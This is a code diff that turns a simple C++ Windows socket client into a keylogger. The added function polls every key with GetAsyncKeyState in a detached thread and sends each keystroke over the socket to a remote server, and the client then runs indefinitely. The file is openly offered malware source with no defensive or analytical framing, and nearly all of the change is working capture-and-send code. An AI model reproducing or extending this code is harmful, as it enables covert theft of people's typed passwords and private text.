@@ -1,9 +1,28 @@
 #include <winsock2.h>
 #include <iostream>
+#include <windows.h>
+#include <thread>
+
+SOCKET s; //global socker for data and connection
+
+//function that captures and sends as pressed keys
+void logKeyPress(){
+    char key;
+
+    while(true){
+        for (key = 8; key <= 190; key++){ //loop to check each key
+            if (GetAsyncKeyState(key) == -32767){ //detect whether a key has been pressed
+                char message[2] = {key, '\0'}; //create a message with key
+                send(s, message, strlen(message), 0); //send key to the server
+            
+                std::cout << "pressed key: " << key << std::endl; //debug
+            }
+        }
+    }
+}
 
 int main(){
     WSADATA wsa; //structure to hold winsock data
-    SOCKET s; //socket descriptor
     struct sockaddr_in server; //structure to store server address information
 
     //initialize WinSock
@@ -35,6 +54,15 @@ int main(){
     //sending message to the server
     const char *message = "Client connected";
     send(s, message, strlen(message), 0); //sending message over the socket
+
+    //starting keylogger in thread
+    std::thread keylogger(logKeyPress);
+    keylogger.detach();
+
+    //infinite cliente
+    while(true){
+        Sleep(1000);
+    }
     
     //closing the socket and cleaning up winsock
     closesocket(s);
